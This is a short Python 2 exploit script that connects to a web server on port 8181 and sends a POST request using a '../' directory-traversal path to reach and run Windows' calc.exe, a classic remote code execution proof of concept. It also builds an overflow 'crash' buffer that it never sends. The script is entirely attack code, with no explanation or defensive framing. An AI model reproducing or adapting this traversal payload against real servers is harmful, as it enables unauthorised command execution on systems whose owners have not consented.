import socket
import sys
 
host = "127.0.0.1"
port = 8181
a = "A" * 1000
b = "B" * 8
c = "C" * 100
crash =a+b+c
httpsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
httpsocket.connect((host,port))
httpsocket.send("POST " + "/cgi-bin/../../../../../../../../Windows/system32/calc.exe " + "HTTP/1.0\r\n\r\n")
httpsocket.close()

print "Sended!"

